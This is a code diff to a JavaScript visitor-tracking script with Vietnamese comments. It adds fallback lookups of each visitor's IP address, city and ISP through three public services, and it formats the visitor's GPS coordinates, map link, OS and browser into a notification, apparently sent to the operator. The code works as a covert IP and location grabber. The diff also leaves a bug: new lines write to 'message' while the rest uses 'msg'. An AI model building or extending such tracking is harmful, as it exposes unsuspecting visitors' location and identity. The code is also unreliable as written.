@@ -106,27 +106,41 @@ function getDeviceModel() {
     return { browser, os, model };
 }
 
-// --- 3. LẤY DỮ LIỆU IP & ISP (HTTPS 100%) ---
-async function fetchFullData() {
-    try {
-        const response = await fetch('https://ipwho.is/');
-        const d = await response.json();
-        if (d.success) {
-            return {
-                ip: d.ip,
-                city: d.city || "Không rõ",
-                isp: d.connection?.isp || d.org || "Nhà mạng ẩn"
-            };
+// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100% để không bị "Không rõ") ---
+async function fetchIpInfo() {
+    const apis = [
+        {
+            // Nguồn 1: ipwho.is (Rất mạnh, hỗ trợ HTTPS tốt)
+            url: 'https://ipwho.is/',
+            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
+        },
+        {
+            // Nguồn 2: ipapi.co (Dự phòng)
+            url: 'https://ipapi.co/json/',
+            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
+        },
+        {
+            // Nguồn 3: Cloudflare (Chỉ lấy IP nếu 2 nguồn trên lỗi)
+            url: 'https://cloudflare.com/cdn-cgi/trace',
+            parse: (d) => {
+                const lines = d.split('\n');
+                const ipLine = lines.find(l => l.startsWith('ip='));
+                return { ip: ipLine ? ipLine.split('=')[1] : "N/A", city: "N/A", isp: "Cloudflare" };
+            },
+            isText: true
         }
-    } catch (e) {
+    ];
+
+    for (const api of apis) {
         try {
-            const res2 = await fetch('https://ipapi.co/json/');
-            const d2 = await res2.json();
-            return { ip: d2.ip, city: d2.city, isp: d2.org };
-        } catch (err) {
-            return { ip: "Lỗi", city: "Lỗi", isp: "Lỗi" };
-        }
+            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
+            if (!res.ok) continue;
+            const data = api.isText ? await res.text() : await res.json();
+            const result = api.parse(data);
+            if (result.ip && result.ip !== "N/A") return result;
+        } catch (e) { continue; }
     }
+    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
 // --- 4. GỬI THÔNG BÁO (Format đẹp y hệt ảnh 1) ---
@@ -146,12 +160,16 @@ async function sendNotification(pos, info) {
     msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
     msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
 
-    if (pos && pos.coords) {
-        const { latitude: lat, longitude: lon } = pos.coords;
-        msg += `📍 <b>Vị trí GPS:</b>\n`;
-        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
+     if (pos && pos.coords) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        message += `📍 <b>Vị trí GPS:</b>\n`;
+        message += `├ Vĩ độ: <code>${lat}</code>\n`;
+        message += `├ Kinh độ: <code>${lon}</code>\n`;
+        message += `└ 👉 <a href="${mapsUrl}">Nhấn để xem Bản đồ</a>\n\n`;
     } else {
-        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
+        message += `⚠️ <b>GPS:</b>Bị từ chối hoặc Không khả dụng\n\n`;
     }
 
     try {
